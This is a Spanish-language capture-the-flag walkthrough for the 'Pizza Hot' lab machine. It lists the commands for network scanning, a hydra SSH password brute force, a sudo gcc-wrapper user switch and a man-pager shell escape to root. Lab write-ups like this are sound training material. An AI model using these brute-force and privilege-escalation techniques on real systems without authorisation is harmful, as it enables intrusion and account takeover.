@@ -1,0 +1,97 @@
+---
+layout: post
+title: "Pizza Hot"
+date: 2024-06-14 10:55:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Pizza Hot </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/pizzahot/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/host.png){:.margin}
+
+**1\.** Enumo dispositivos en la red.
+
+`sudo arp-scan -l`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/arp.png){:.margin}
+
+**2\.** Escaneo los puertos y servicios.
+
+`sudo nmap -p- --open -sCV -T5 -n -Pn --min-rate=5000 192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/nmap.png){:.margin}
+
+**3\.** Visito la web, revisando la fuente encuentro un usuario potencial.
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/80.png){:.margin}
+![img](/notas/public/img/thehackerlabs/PizzaHot/80code.png){:.margin}
+
+**4\.** Bruteforce con hydra al ssh.
+
+`hydra -l pizzapiña -P /usr/share/wordlists/wockyou.txt ssh://192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/hydra.png){:.margin}
+
+**5\.** Conectandome por ssh con el usuario pizzapiña.
+
+`ssh pizzapiña@192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/ssh.png){:.margin}
+
+**6\.** Viendo nuestros permisos sudo, tengo el binario gcc que puedo ejecutar como pizzasinpiña.
+
+`sudo -l`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/sudol.png){:.margin}
+
+**7\.** En [gtfobins](https://gtfobins.github.io/gtfobins/gcc/#sudo) tenemos el comando para escalar o en este caso migrar de usuario.
+
+`sudo -u pizzasinpiña gcc -wrapper /usr/bin/bash,-s .`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/pizzasinpiña.png){:.margin}
+
+**8\.** Ahora tenemos un binario que podemos ejecutar como root.
+
+`sudo -l`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/sudol2.png){:.margin}
+
+**9\.** Escalando privilegios a root, [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).
+
+_9.1- Ejecutamos el siguiente comando_
+
+`sudo -u root man man`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/man.png){:.margin}
+
+_9.2- En este punto nos lanzamos una bash_
+
+`!/bin/bash`
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/man2.png){:.margin}
+
+_9.3- Ya somos root_
+
+![img](/notas/public/img/thehackerlabs/PizzaHot/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
